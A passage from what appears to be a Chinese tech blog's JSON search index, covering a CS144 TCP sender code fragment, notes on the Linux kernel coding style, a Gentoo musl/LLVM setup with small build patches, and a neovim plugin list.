!= 0 ) { initial_RTO_ms_ /= ( 2 * re_try_count_ ); } re_try_count_ = 0; } void TCPSender::tick( uint64_t ms_since_last_tick, const TransmitFunction\u0026 transmit ) { past_time_ += ms_since_last_tick; for ( auto\u0026 val : buffer_ ) { if ( past_time_ \u003e= initial_RTO_ms_ ) { past_time_ = 0; if ( !val.keep_rto ) { initial_RTO_ms_ *= 2; ++re_try_count_; } transmit( val.msg ); break; } } } 我承认我写的代码还是很难绷的，等有时间我再优化一下看看。 $ cmake","date":"2024-08-12","objectID":"/posts/cs144_lab3/:1:0","tags":["CS144_lab"],"title":"CS144-2024-lab_3: the TCP sender","uri":"/posts/cs144_lab3/"},{"categories":null,"content":"尝试阅读 Linux kernel 文档中的代码规范","date":"2024-08-11","objectID":"/posts/linux_code_style/","tags":["linux"],"title":"Linux kernel 代码规范","uri":"/posts/linux_code_style/"},{"categories":null,"content":"尝试阅读 Linux kernel 文档中的代码规范 Linux kernel 代码规范 ","date":"2024-08-11","objectID":"/posts/linux_code_style/:0:0","tags":["linux"],"title":"Linux kernel 代码规范","uri":"/posts/linux_code_style/"},{"categories":null,"content":"背景 我也真是闲的😅。不过话说回来，我一直有听说 Linux kernel 的代码规范，比如缩进 8 空格（这是我唯一知道的 8 字符缩进的项目），一行代码不能超过 80 个字符。 所以我准备好好看一下 Linux kernel 的代码规范到底是什么。 有几个部分并不算是比较通用的代码规范，我就没有记。 ","date":"2024-08-11","objectID":"/posts/linux_code_style/:1:0","tags":["linux"],"title":"Linux kernel 代码规范","uri":"/posts/linux_code_style/"},{"categories":null,"content":"coding style ","date":"2024-08-11","objectID":"/posts/linux_code_style/:2:0","tags":["linux"],"title":"Linux kernel 代码规范","uri":"/posts/linux_code_style/"},{"categories":null,"content":"缩进 Tab 就是 8 字符，因此缩进就是 8 字符。一些异端试图将缩进设为 4 甚至是 2，这就像是将 Pi 的值设置为 3 一样。 理由: 缩进的意义在于明确一些代码块的起点和终点，当你连续面对屏幕工作 20 个小时的时候，较大的缩进会让你更好的工作。 现在有些人认为 8 个字符的缩进会让代码太往右移了，但是如果你的代码超过了 3 个缩进级别，那这段代码的逻辑就是很难绷的，你应该修改它。 简化 switch 中的多个缩进级别的首选方式是 把 switch 和 case 对齐。例如: switch (suffix) { case 'G': case 'g': mem \u003c\u003c= 30; break; case 'M': case 'm': mem \u003c\u003c= 20; break; case 'K': case 'k': mem \u003c\u003c= 10; fallthrough; default: break; } 除非你有什么要隐藏的东西，否则不要在一行放多个语句: if (condition) do_this; do_something_everytime; 不要使用 , 而避免使用 {} if (condition) do_this(), do_that(); 除了注释，文档和 Kconfig 之外，空格不会用于缩进。行尾不可留有空格。 ","date":"2024-08-11","objectID":"/posts/linux_code_style/:2:1","tags":["linux"],"title":"Linux kernel 代码规范","uri":"/posts/linux_code_style/"},{"categories":null,"content":"断开长字符串 单行长度限制为 80 字符。超过 80 字符的部分应该被分成合理的块，除非超过 80 字符具有很好的可读性且不会隐藏信息。 子语句比父语句的缩进级别更深，一个常见的风格就是函数体部分和函数的左括号对齐。 不能破坏用户可见的字符串(如printf)。这会让用户用 grep 的时候很难绷 ","date":"2024-08-11","objectID":"/posts/linux_code_style/:2:2","tags":["linux"],"title":"Linux kernel 代码规范","uri":"/posts/linux_code_style/"},{"categories":null,"content":"大括号与空格 C 代码风格中经常会出现的问题就是大括号的位置，这几乎不存在技术原因的选择。Kernighan 和 Ritchie 向我们展示了一种风格: if (x is true) { we do y } 这适用于所有非函数语句块，如: switch (action) { case KOBJ_ADD: return \"add\"; case KOBJ_REMOVE: return \"remove\"; case KOBJ_CHANGE: return \"change\"; default: return NULL; } 函数是一种特殊情况: 它的左大括号是另起一行: int function(int x) { body of function } 右大括号所在的那一行应该不会有其他语句，除非那个语句是上面这段语句的连续，如: do { body of do-loop } while (condition); if (x == y) { .. } else if (x \u003e y) { ... } else { .... } 理由: K\u0026R 如无必要，单个语句即可完成的地方不用大括号: if (condition) do_this(); else do_that(); 但像 if-else 只有一个分支是单个语句的话就应该都加大括号: if (condition) { do_this(); do_that(); } else { otherwise(); } 此外，当循环包含多个简单语句的时候使用大括号: while (condition) { if (test) do_something(); } 空格 Linux kernel 使用空格的风格主要在于函数和关键字的使用。大多数关键字后面都加空格，除了 sizeof, typedef, alignof 和 __attribute__。 也就是 if, switch, case, for, do, while 这样的关键字后面跟空格，但是下面这段代码不会: s = sizeof(struct file); 不要写成 s = sizeof( struct file ); 这样很难绷。 当声明指针或者返回指针类型的函数时，* 首选的办法是和变量名或者函数名靠近，而不是和类型名靠近: char *linux_banner; unsigned long long memparse(char *ptr, char **retptr); char *match_strdup(substring_t *s); 下面这些二元运算符左右两边都加空格: = + - \u003c \u003e * / % | \u0026 ^ \u003c= \u003e= == != ? : 但下面这些一元运算符后面没有空格: \u0026 * + - ~ ! sizeof typeof alignof __attribute__ defined ++ -- 运算符靠近变量那一侧没有空格（就是 a++ 而不是 a ++） . 和 -\u003e 周围没有空格 不要在行尾留有空格 ","date":"2024-08-11","objectID":"/posts/linux_code_style/:2:3","tags":["linux"],"title":"Linux kernel 代码规范","uri":"/posts/linux_code_style/"},{"categories":null,"content":"命名 C 语言中不要使用诸如 ThisVariableIsATemporaryCounter 这样的变量命名，这应该写成 tmp。 虽然大小写混合的名称不受欢迎，但是全局的符号的名称要具有一定的用于描述的信息，比如统计当前活跃的用户数量的函数，可以命名为 count_active_users，但不要写成 cntusr()。 将函数类型编码到其名称中的行为（被称为 Hungarian notation，匈牙利表示法）是很难绷的，编译器无论如何都知道它的类型，这只会让开发者感到困惑。 本地变量命名要尽可能简短，比如一个循环计数器被命名为 i，为了不产生误解而命名成 loop_counter 是没有意义的行为，tmp 也可以用于临时存储任何类型的值。 如果你害怕混淆局部变量的名称，那么你就会遇到另一个问题—— function-growth-hormone-imbalance syndrome，参考 函数 那部分。 对于符号名称和文档，避免 master / slave 或 blacklist / whitelist 的用法。 对于 master / slave，推荐使用: ‘{primary,main} / {secondary,replica,subordinate}’ ‘{initiator,requester} / {target,responder}’ ‘{controller,host} / {device,worker,proxy}’ ‘leader / follower’ ‘director / performer’ blacklist / whitelist 推荐使用: ‘denylist / allowlist’ ‘blocklist / passlist’ 引入新用法的情况是维护用户空间的 ABI/API，或者更新代码以符合 2020 年前存在的硬件或协议规范（这些规范强制使用这些术语）。对于新规范，应尽可能将其翻译成现有的编码标准。 ","date":"2024-08-11","objectID":"/posts/linux_code_style/:2:4","tags":["linux"],"title":"Linux kernel 代码规范","uri":"/posts/linux_code_style/"},{"categories":null,"content":"Typedefs 不要对使用类似 vps_t 的东西，对结构体和指针使用 typedef 是很难绷的行为。当你看到下面这段代码时，你可能会有些困惑: vps_t a; 但如果换成下面这样就很清晰: struct virtual_container *a; 有人认为 typedef 就会帮助提高可读性，但实际上未必，只有下面这些情况是有用的: 完全不透明的地方，使用 typedef 主动隐藏对象是什么 例如 pte_t 等对象，你必须正确使用访问函数（accessor functions）去访问它们。 不透明和访问函数本身并不好，为 pte_t 等设计成这样的原因是可移植的信息基本为 0（貌似意思是说，不同架构的 pte_t 实际类型不一致） 清晰整数类型，这种抽象有助于避免混淆，无论是 int 还是 long，u8, u16, u64 就是很好的类型定义。 某些时候可能会遇到不同架构使用不同的数据类型的情况，这时候可以使用 typedef unsigned int myflags_t; 将类型抽象出来。 当你使用 sparse 来创建一个新的类型进行类型检查时 sparse 是一个语法检查工具。 在一些特殊情况下，新类型和 C99 类型相同。 比如有些人不习惯 uint32_t 类型，因此，Linux 有 u8, u16, u32, u64。 在用户空间安全的类型 在部分用户空间可见的结构中，不能要求 C99 的类型，也不能使用 u32，因此都使用 __u32 或类似的。 或许还有其他情况，但基本规则就这些了。 通常，指针和结构体等合理使用的元素，应该直接访问，而不是使用 typedef ","date":"2024-08-11","objectID":"/posts/linux_code_style/:2:5","tags":["linux"],"title":"Linux kernel 代码规范","uri":"/posts/linux_code_style/"},{"categories":null,"content":"函数 函数应该简短优雅，它们应该占用一两个屏幕的大小（众所周知，ISO/ANSI 屏幕尺寸 80x24）。 函数的最大长度与函数的复杂性和缩进级别成反比。如果你有一个概念上很简单的函数，它只是一个长（但简单）的 case 语句，你必须为许多不同的情况做很多小事情，那么一个更长的函数是可以接受的。 如果你有一个复杂的函数，并且你怀疑一个不太有天赋的初学者可能甚至无法理解这个函数是什么，你应该更加严格地遵守最大限制。使用具有描述性名称的辅助函数（如果你认为它对性能至关重要，可以让编译器内联它们，它可能会比你做得更好）。 函数的另一个衡量标准是局部变量的数量。它们不应超过 5-10，否则你就做错了。重新思考该功能，并将其分成更小的部分。人脑通常可以轻松地记住大约 7 种不同的事物，任何更多的事物都会变得混乱。您知道自己很聪明，但也许您想了解两周后自己做了什么。 在源文件中，用一个空行分隔函数。如果函数是导出的，则其 EXPORT 宏应紧跟在大括号所在行之后: int system_is_up(void) { return system_state == SYSTEM_RUNNING; } EXPORT_SYMBOL(system_is_up); 函数原型 在函数原型中,将参数名称及其数据类型包括在内。尽管 C 语言并不要求，但在 Linux 中是首选 因为这是为读者添加有价值信息的简单方法。 不要在函数声明中使用 extern 关键字，因为这会使行更长，而且并不是绝对必要的。 函数原型应该遵循 元素顺序规则: __init void * __must_check action(enum magic value, size_t size, u8 count, char *fmt, ...) __printf(4, 5) __malloc; 存储类（下面是 static __always_inline，注意 __always_inline 在技术上是一个属性，但被视为内联） 存储类属性（此处为 __init，即节声明，但也包括 __cold 之类的东西） 返回类型（此处为 void *） 返回类型属性（此处为 __must_check） 函数名称（此处为 action） 函数参数（这里，(enum magic value，size_t size，u8 count，char *fmt，...)，注意应始终包含参数名称） 函数参数属性（此处为 __printf(4, 5)） 函数行为属性（此处为 __malloc） 对于函数定义（即实际的函数体），编译器不允许在函数参数之后添加函数参数属性。在这些情况下，它们应该遵循存储类属性（例如，与上面的声明示例相比，请注意下面 __printf(4, 5) 的位置更改） static __always_inline __init __printf(4, 5) void * __must_check action(enum magic value, size_t size, u8 count, char *fmt, ...) __malloc { ... } ","date":"2024-08-11","objectID":"/posts/linux_code_style/:2:6","tags":["linux"],"title":"Linux kernel 代码规范","uri":"/posts/linux_code_style/"},{"categories":null,"content":"函数推出逻辑的集中 当函数从多个位置退出并且必须完成一些常见工作（例如清理）时，goto 语句会派上用场。如果不需要清理则直接返回。 选择说明 goto 功能或 goto 存在原因的标签名称。 out_free_buffer 是一个好名字的例子：如果 goto 释放缓冲区。避免使用 err1: 和 err2: 等 GW-BASIC 名称，因为如果您添加或删除退出路径，则必须对它们重新编号，而且无论如何它们都会使正确性难以验证。 无条件陈述更容易理解和遵循 嵌套减少 防止在进行修改时因不更新各个退出点而出现的错误 节省编译器优化冗余代码的工作 int fun(int a) { int result = 0; char *buffer; buffer = kmalloc(SIZE, GFP_KERNEL); if (!buffer) return -ENOMEM; if (condition1) { while (loop1) { ... } result = 1; goto out_free_buffer; } ... out_free_buffer: kfree(buffer); return result; } ","date":"2024-08-11","objectID":"/posts/linux_code_style/:2:7","tags":["linux"],"title":"Linux kernel 代码规范","uri":"/posts/linux_code_style/"},{"categories":null,"content":"注释 注释是好的，但也存在过度注释的危险。永远不要试图在注释中解释你的代码是如何工作的：最好编写代码，以便其工作原理显而易见，并且解释写得不好的代码是浪费时间。 一般来说，您希望您的注释说明您的代码做了什么，而不是如何做。另外，尽量避免在函数体内添加注释：如果函数非常复杂，您需要单独注释其中的某些部分，那么您可能应该暂时返回到函数那部分的说明。您可以发表一些小注释来注意或警告某些特别聪明（或丑陋）的事情，但尽量避免过度。相反，将注释放在函数的开头，告诉人们它的作用，以及可能为什么这样做。 多行注释的首选格式是: /* * This is the preferred style for multi-line * comments in the Linux kernel source code. * Please use it consistently. * * Description: A column of asterisks on the left side, * with beginning and ending almost-blank lines. */ 对于 net/, drivers/net/ 中的文件，推荐的多行注释格式是: /* The preferred comment style for files in net/ and drivers/net * looks like this. * * It is nearly the same as the generally preferred comment style, * but there is no initial almost-blank line. */ 对数据进行注释也很重要，无论它们是基本类型还是派生类型。为此，每行仅使用一个数据声明（多个数据声明不使用逗号）。这为您留下了对每个项目进行小评论的空间，解释其用途。 ","date":"2024-08-11","objectID":"/posts/linux_code_style/:2:8","tags":["linux"],"title":"Linux kernel 代码规范","uri":"/posts/linux_code_style/"},{"categories":null,"content":"宏，枚举 和 RTL 宏和枚举中的常量都应该大写定义 #define CONSTANT 0x12345 ","date":"2024-08-11","objectID":"/posts/linux_code_style/:2:9","tags":["linux"],"title":"Linux kernel 代码规范","uri":"/posts/linux_code_style/"},{"categories":null,"content":"内联 似乎有一种常见的误解，认为 gcc 有一个神奇的“让程序更快”加速选项，称为内联。虽然使用内联可能是合适的（例如作为替换宏的一种方法），但通常情况下并不合适。大量使用 inline 关键字会导致内核变得更大，这反过来又会减慢系统的整体速度，因为 CPU 的 icache 占用空间更大，而且可用于页面缓存的内存更少。想一想吧；页面缓存未命中会导致磁盘查找，这很容易花费 5 毫秒。有很多 CPU 周期可以进入这 5 毫秒。 一个合理的经验法则是不要在代码超过 3 行的函数中放置内联。此规则的一个例外是已知参数是编译时常量的情况，并且由于这种常量，您知道编译器将能够在编译时优化大部分函数。有关后一种情况的一个很好的示例，请参阅 kmalloc() 内联函数。 人们常常认为，向静态且仅使用一次的函数添加内联始终是一个胜利，因为没有空间权衡。虽然这在技术上是正确的，但 gcc 能够在没有帮助的情况下自动内联这些内容，并且当函数被多次使用时，需要移除inline关键字以避免潜在问题，这个维护问题可能超过了提示 gcc 做它本来会做的事情的好处。 ","date":"2024-08-11","objectID":"/posts/linux_code_style/:2:10","tags":["linux"],"title":"Linux kernel 代码规范","uri":"/posts/linux_code_style/"},{"categories":null,"content":"函数返回值和名称 函数可以返回多种不同类型的值，最常见的一种是指示函数是成功还是失败的值。这样的值可以表示为错误代码整数（-Exxx = 失败，0 = 成功）或成功的布尔值（零 = 失败，非零 = 成功）。 混合这两种表示形式是难以发现的错误的丰富来源。如果 C 语言对整数和布尔值进行了严格区分，那么编译器就会为我们发现这些错误……但事实并非如此。为了帮助防止此类错误，请始终遵循以下约定： If the name of a function is an action or an imperative command, the function should return an error-code integer. If the name is a predicate, the function should return a “succeeded” boolean. 如果函数的名称是动作或命令式命令，该函数应返回一个错误代码整数。 如果名字是一个 predicate，该函数应该返回一个“成功”布尔值。 例如，add work 是一个命令，add_work() 函数返回 0 表示成功，或 -EBUSY 表示失败。同样，PCI 设备存在是一个 predicate，如果 pci_dev_present() 函数成功找到匹配设备，则返回 1，否则返回 0。 所有 EXPORT 函数都必须遵守此约定，所有公共函数也应如此。私有（静态）函数不需要，但建议这样做。 返回值是计算的实际结果而不是计算是否成功的指示的函数不受此规则的约束。通常，它们通过返回一些超出范围的结果来指示失败。典型的例子是返回指针的函数；他们使用 NULL 或 ERR_PTR 机制来报告失败。 ","date":"2024-08-11","objectID":"/posts/linux_code_style/:2:11","tags":["linux"],"title":"Linux kernel 代码规范","uri":"/posts/linux_code_style/"},{"categories":null,"content":"bool Linux kernel 的 bool 类型是 C99 _Bool 类型的别名。 bool 值只能计算为 0 或 1，隐式或显式转换为 bool 会自动将该值转换为 true 或 false。当使用 bool 类型时 !!不需要构建，这消除了一类错误。 bool 函数返回类型和堆栈变量总是可以在适当的时候使用。鼓励使用 bool 来提高可读性，并且通常是比 int 更好的选择来存储布尔值。 如果缓存行布局或值的大小很重要，请勿使用 bool，因为其大小和对齐方式根据编译的体系结构而变化。针对对齐和大小进行优化的结构不应使用 bool。 如果结构有许多 true/false 值，请考虑将它们合并到具有 1 位成员的位字段中，或使用适当的固定宽度类型，例如 u8。 类似地，对于函数参数，许多 true/false 可以合并到单个按位“标志”参数中，如果调用站点具有裸露的真/假常量，那么“标志”通常可以是更具可读性的替代方案。 否则，在结构和参数中限制使用 bool 可以提高可读性。 ","date":"2024-08-11","objectID":"/posts/linux_code_style/:2:12","tags":["linux"],"title":"Linux kernel 代码规范","uri":"/posts/linux_code_style/"},{"categories":null,"content":"内联汇编 在架构特定代码中，你可能需要使用内联汇编来与 CPU 或平台功能进行接口。必要时不要犹豫使用内联汇编。但是，不要在 C 可以完成任务时滥用内联汇编。当可能时，你可以并且应该从 C 中访问硬件。 考虑编写简单的辅助函数来包装内联汇编的常见位，而不是重复编写稍有变化的函数。请记住，内联汇编可以使用 C 参数。 大型的、重要的汇编函数应该放在 .S 文件中，并在 C 头文件中定义相应的 C 原型。汇编函数的 C 原型应使用 asmlinkage。 根据 kernel newbies，asmlinkage 是一个宏，它告诉编译器该函数不应期望在寄存器中找到其任何参数（常见的优化），而只能在 CPU 的堆栈上找到。 您可能需要将您的 asm 语句标记为 volatile ，以防止 GCC 在没有注意到任何副作用时删除它。不过，您并不总是需要这样做，而且不必要地这样做会限制优化。 ","date":"2024-08-11","objectID":"/posts/linux_code_style/:2:13","tags":["linux"],"title":"Linux kernel 代码规范","uri":"/posts/linux_code_style/"},{"categories":null,"content":"Conditional Compilation 在可能的情况下，不要在 .c 文件中使用预处理器条件指令（如 #if, #ifdef 等），这样会使代码更难读懂，逻辑也更难跟踪。相反，应该在头文件中定义这些条件指令，用于定义在 .c 文件中使用的函数，并在 #else 情况下提供无操作的占位版本。然后，从 .c 文件中无条件调用这些函数。编译器会避免为占位调用生成任何代码，从而产生相同的结果，但逻辑仍然容易跟踪。 更倾向于编译出整个函数，而不是函数的一部分或表达式的一部分。不要在表达式中放置 ifdef，而是将表达式的一部分或全部提取到一个单独的辅助函数中，并将条件应用于该函数。 如果你有一个函数或变量在特定配置下可能不会被使用，并且编译器会警告其定义未使用，可以将其标记为 __maybe_unused，而不是将其包裹在预处理器条件指令中。（但是，如果一个函数或变量始终不会被使用，请删除它）。 ","date":"2024-08-11","objectID":"/posts/linux_code_style/:2:14","tags":["linux"],"title":"Linux kernel 代码规范","uri":"/posts/linux_code_style/"},{"categories":["Linux_杂谈"],"content":"尝试使用选择了 musl/llvm 的 profile 的 Gentoo Linux 作为日常使用的桌面操作系统","date":"2024-08-05","objectID":"/posts/gentoo_musl_llvm/","tags":["gentoo-linux","linux","musl libc"],"title":"在 Gentoo Linux 上尝试 musl libc + llvm 环境","uri":"/posts/gentoo_musl_llvm/"},{"categories":["Linux_杂谈"],"content":"尝试使用选择了 musl/llvm 的 profile 的 Gentoo Linux 作为日常使用的桌面操作系统 在 Gentooo Linux 上尝试 musl libc + llvm 环境 ","date":"2024-08-05","objectID":"/posts/gentoo_musl_llvm/:0:0","tags":["gentoo-linux","linux","musl libc"],"title":"在 Gentoo Linux 上尝试 musl libc + llvm 环境","uri":"/posts/gentoo_musl_llvm/"},{"categories":["Linux_杂谈"],"content":"背景 以前就有听说过 musl libc 了，一个体积小，并且完全按照标准实现的 libc，但一直没想过使用这个 libc。前几天看到 Gentoo Linux 对于 musl libc 有很多 profile 可以使用（不过都是实验性的，而非 stable）。 一定程度上这完成了之前安装 Gentoo Linux 的文章中的目标: 我在安装前的预计其实是用 Gentoo Linux，同时 init 使用 openrc，默认编译工具链用 clang/llvm，用 hardened profile 并且开一些额外的编译选项（比如 thinlto 之类的）。不过目前只实现了使用 openrc 和 hardened profile。 之前那次我没有实现这些目标，只是使用了 openrc，这次我使用这个 profile 确实实现了这一点，因为 systemd 依赖于 glibc，所以我选择使用 openrc，默认编译工具链就是 clang/llvm，甚至 C++ 标准库使用的也是提供的 libc++，因为默认用 clang/llvm 编译，所以我直接默认就开启了 thinlto。 ","date":"2024-08-05","objectID":"/posts/gentoo_musl_llvm/:1:0","tags":["gentoo-linux","linux","musl libc"],"title":"在 Gentoo Linux 上尝试 musl libc + llvm 环境","uri":"/posts/gentoo_musl_llvm/"},{"categories":["Linux_杂谈"],"content":"安装前 musl libc 的作者提供了一个 musl uClibc glibc dietlibc 之间的比较，musl libc 体积上确实小，不过部分库函数的性能不如 glibc。并且由于 glibc 中存在 GNU 的一些扩展，导致 musl libc 和 glibc 不能完全兼容，一些依赖于 glibc 的闭源发行二进制软件包的程序可能无法运行在 musl libc 上，不过可以尝试使用flatpak 运行。 Chromium 浏览器无法使用 musl libc 编译，electorn 的也无法使用。一定程度上，这迫使一直用 Visual Studio Code 的我开始使用 neovim。 musl libc 支持的 locale 还不是很多： [1] C [2] C.UTF-8 [3] sr_RS.UTF-8 [4] cs_CZ.UTF-8 [5] nb_NO.UTF-8 [6] de_DE.UTF-8 [7] sv_SE.UTF-8 [8] nl_NL.UTF-8 [9] fr_FR.UTF-8 [10] fi_FI.UTF-8 [11] en_GB.UTF-8 [12] it_IT.UTF-8 [13] pt_PT.UTF-8 [14] en_US.UTF-8 * [15] de_CH.UTF-8 [16] es_ES.UTF-8 [17] pt_BR.UTF-8 [18] ru_RU.UTF-8 这里没有 zh_CN.UTF-8。 musl libc 设置时区的方式也会有所不同，需要在 /etc/env.d/00musl 文件中写好 TZ 环境变量。 以上关于 locale 和时区的设置，Gentoo wiki 都有说明。在 Gentoo 的另一篇 wiki 记录了一些常见的 musl libc 编译可能遇到的问题（即编译那些一定程度上依赖于 glibc 的软件）。 ","date":"2024-08-05","objectID":"/posts/gentoo_musl_llvm/:2:0","tags":["gentoo-linux","linux","musl libc"],"title":"在 Gentoo Linux 上尝试 musl libc + llvm 环境","uri":"/posts/gentoo_musl_llvm/"},{"categories":["Linux_杂谈"],"content":"安装时遇到的问题 一开始装完后，进入 grub，进入 openrc 后就没后续了，之后重新装一编就没有遇到这个问题。不好评价这个问题的原因。 不知道是不是我这个内核版本的原因，我用 openrc 从来没有正常关机过，直接死在那里，后来我换到 stable 内核就没有这个问题了。 firefox-115 esr 版本无法正常编译，会报一些错误类似: ld.lld: error: undefined hidden symbol。详情可以参考 GitHub 上 LLVM 的 issue 以及 FreeBSD Bugzilla 上的讨论。而且 rust 编译的部分也会出现问题。 我参考了 FreeBSD 上的解法，首先是 rust 那里，根据 FreeBSD Bugzilla 上的讨论，原因是: rust-bindgen uses some tricks to generate bindings for C++ components, but gets confused by some new constructs in libc++ 18 headers, causing it to generate faulty binding code. 该问题已经被今年 1 月份的补丁 解决，对此我选择不用 esr 版本，用 stable 的版本。 其次对于 undefined hidden symbol 的问题，则是为 firefox 的编译单独创建一个环境。在 /etc/portage/env/ 目录下创建一个 compiler-clang-firefox 文件，文件内容是: COMMON_FLAGS=\"-O2 -march=x86-64-v3 -pipe -fvisibility=hidden -fvisibility-inlines-hidden\" CLAGS=\"${COMMON_FLAGS}\" CXXFLAGS=\"${COMMON_FLAGS}\" CC=\"clang\" CXX=\"clang++\" CPP=\"clang-cpp\" AR=\"llvm-ar\" NM=\"llvm-nm\" RANLIB=\" llvm-ranlib\" 也就是 CXXFLAGS 加上 -fvisibility=hidden -fvisibility-inlines-hidden 新建 /etc/portage/package.env/ 目录，在其中新建一个文件写入: www-client/firefox compiler-clang-firefox 这样就可以使用指定的编译环境编译了。 对于 dev-libs/darts 来说，由于 src/lexicon.h 中的 std::random_shuffle 在 std 中已经不存在，cppreference 中也可以看到，该函数 从 C++ 17 开始就废除了。所以我给它写了个 patch。 在 /etc/portage/ 目录下新建一个 patches 的文件夹，然后在 patches 里新建 dev-libs/darts 这两级文件夹，之后把补丁放进去，安装的时候会自动 patch。 diff --git a/src/lexicon.h b/src/lexicon.h index a2935f4..2a30d1b 100644 --- a/src/lexicon.h +++ b/src/lexicon.h @@ -1,3 +1,4 @@ +// clang-format off #ifndef DARTS_LEXICON_H_ #define DARTS_LEXICON_H_ @@ -7,6 +8,7 @@ #include \u003cctime\u003e #include \u003ciostream\u003e #include \u003climits\u003e +#include \u003crandom\u003e #include \u003cvector\u003e #include \"./mersenne-twister.h\" @@ -58,9 +60,9 @@ class Lexicon { } // randomize() shuffles keys. Values are not affected. void randomize() { - Darts::MersenneTwister mt( - static_cast\u003cDarts::MersenneTwister::int_type\u003e(std::time(NULL))); - std::random_shuffle(keys_.begin(), keys_.end(), mt); + std::random_device rd; + std::mt19937 g(rd()); + std::shuffle(keys_.begin(), keys_.end(), g); } void split(); 我开头有 // clang-format off 的原因是我的 neovim 会保存时候自动调用 clang-format 格式化。 如果遇到了 Hyprland 0.42 编译失败的情况，报错是 copy_if 等函数没有找到，可以使用我找到的这个 patch From eb42adc4c090918ad6be9fcb24066da8cdfd9bd0 Mon Sep 17 00:00:00 2001 From: Serenity Braesch \u003cSerenity.Braesch@proton.me\u003e Date: Sat, 24 Aug 2024 01:53:08 -0600 Subject: [PATCH] Fix missing include needed by clang --- src/managers/XCursorManager.cpp | 1 + 1 file changed, 1 insertion(+) diff --git a/src/managers/XCursorManager.cpp b/src/managers/XCursorManager.cpp index 7fc21a28..1e7ca535 100644 --- a/src/managers/XCursorManager.cpp +++ b/src/managers/XCursorManager.cpp @@ -1,3 +1,4 @@ +#include \u003calgorithm\u003e #include \u003ccstring\u003e #include \u003cdirent.h\u003e #include \u003cfilesystem\u003e -- 2.44.2 这已经被 合并到 Hyprland 主线 里了，等下一个版本应该就没这个事情了。 ","date":"2024-08-05","objectID":"/posts/gentoo_musl_llvm/:3:0","tags":["gentoo-linux","linux","musl libc"],"title":"在 Gentoo Linux 上尝试 musl libc + llvm 环境","uri":"/posts/gentoo_musl_llvm/"},{"categories":["Linux_杂谈"],"content":"后记 我没有尝试什么桌面环境，本身我这台计算机的性能就没强到哪去，所以我安装了 sway，还算正常。后来还是用了 Hyprland，xdg-desktop-portal-hyprland 这个软件是 guru 仓库内的，好家伙。 ","date":"2024-08-05","objectID":"/posts/gentoo_musl_llvm/:4:0","tags":["gentoo-linux","linux","musl libc"],"title":"在 Gentoo Linux 上尝试 musl libc + llvm 环境","uri":"/posts/gentoo_musl_llvm/"},{"categories":null,"content":"尝试配置 neovim，具体就是安装了一些插件，这里没有太详细介绍我的配置，等之后有时间我再补上","date":"2024-07-31","objectID":"/posts/neovim_setup/","tags":["neovim","intro"],"title":"我的 neovim 配置","uri":"/posts/neovim_setup/"},{"categories":null,"content":"尝试配置 neovim，具体就是安装了一些插件，这里没有太详细介绍我的配置，等之后有时间我再补上 我的 neovim 配置 先放个我配置后的样子: ","date":"2024-07-31","objectID":"/posts/neovim_setup/:0:0","tags":["neovim","intro"],"title":"我的 neovim 配置","uri":"/posts/neovim_setup/"},{"categories":null,"content":"背景 我在第一次接触 GNU/Linux 的时候，就有听说过 vi/vim，那时候我还只知道如何在 insert, normal 等模式中切换，如何保存并退出文件。甚至我那时候还不知道有 GNU nano，后来知道了 nano 这个软件后，简单的编辑文件的工作我就会使用 nano，基本不会太用到 vim 了。 后来我使用了一些 WM 来当成桌面（比如 i3, dwm），我在搜集资料时接触到了更多使用这些 WM 还使用 vim/neovim 的用户（只能说使用 WM 的大多更习惯使用终端）。不过我不是这时候听说 neovim 的，我已经忘了怎么听说 neovim 的了。 但在我希望使用 Wayland 的桌面之后，我就一定程度上有了更多使用 vim 操作的想法。这个想法是在我使用 GNOME 桌面环境时候产生的，因为 GNOME 的 mutter 只实现了 text-input-v3，导致不支持 text-input-v3 的 VSCodium 无法正常使用 fcitx5，这让我输入中文的时候很难受。于是我就有了使用 neovim 的想法，因为终端是可以输入中文的（不过也许现在可以考虑下 zed 🤔），至于为什么选择 neovim，因为听说比 vim 好用（我记得比较多的是 vimrc 和 lua 的对比，但是我本身没有配置 vim 的经历，所以我没有这种比较）。 使用 neovim 给我比较好的两个印象，一个 normal 模式和 insert 模式的光标是不一样的，看着还不错，另一个是 :s 搜索替换时，键入替换后的字符串后，当前界面那些要替换的字符会自动跟着修改，我印象中vim 默认不是这样的。 ","date":"2024-07-31","objectID":"/posts/neovim_setup/:1:0","tags":["neovim","intro"],"title":"我的 neovim 配置","uri":"/posts/neovim_setup/"},{"categories":null,"content":"使用的插件 大致上是使用了这些插件: 管理插件，用于插件的安装安装配置更新等工作 folke/lazy.nvim 管理 lsp williamboman/mason.nvim lsp 相关配置 neovim/nvim-lspconfig 代码补全相关 hrsh7th/nvim-cmp hrsh7th/cmp-nvim-lsp hrsh7th/cmp-nvim-lsp-signature-help hrsh7th/cmp-path hrsh7th/cmp-cmdline hrsh7th/cmp-buffer rafamadriz/friendly-snippets L3MON4D3/LuaSnip saadparwaiz1/cmp_luasnip UI 相关 folke/trouble.nvim nvim-treesitter/nvim-treesitter rebelot/heirline.nvim romgrk/barbar.nvim nvim-neo-tree/neo-tree.nvim nvim-notify utils nvim-telescope/telescope.nvim akinsho/toggleterm.nvim lewis6991/gitsigns.nvim 调试器集成 mfussenegger/nvim-dap rcarriga/nvim-dap-ui 调试器就这些是因为我目前就打算先配置 C/C++ 的调试环境，用的是我本机的 gdb，也就没想装一个类似 mason 这样的插件来下载调试器。 代码补全相关中，nvim-cmp 是用来补全的插件，那些以 nvim-cmp 为前缀的都是具体要补全的项，比如 nvim-cmp-lsp 是根据 lsp 的补全，nvim-cmp-path 是根据路径的补全，nvim-cmp-buffer 是根据当前打开的文件内容的补全等等，LuaSnip 是一个代码片段引擎（neovim 0.10 之后内置了一个代码片段引擎，可以使用那个，具体可以参考我的配置文件，friendly-snippets 则是一个实用代码片段集合。 UI 相关中，rebelot/heirline 是用于显示底部的状态栏的，虽然这个插件也能定制顶部的 TabLine，但是我懒得去学了，直接用的 romgrk/barbar。 调试器方面，dap 给我的感觉类似于 lsp 一样，不过我没仔细了解，nvim-dap 中有文档 描述了支持的调试器。我根据文档配置了 gdb 的调试环境。 ","date":"2024-07-31","objectID":"/posts/neovim_setup/:2:0","tags":["neovim","intro"],"title":"我的 neovim 配置","uri":"/posts/neovim_setup/"},{"categories":null,"content":"tricks 一开始我配置完底部状态栏有个问题，每个窗口都有一个单独的状态栏，但我不需要这样，后来我在 Youtube 上找到个博主自称需要添加这行代码就可以解决: vim.opt.laststatus = 3 真的是这样，泪目 lsp 的错误诊断无法在插入模式下使用，后来在 Stack Overflow 的一个帖子上找到了答案 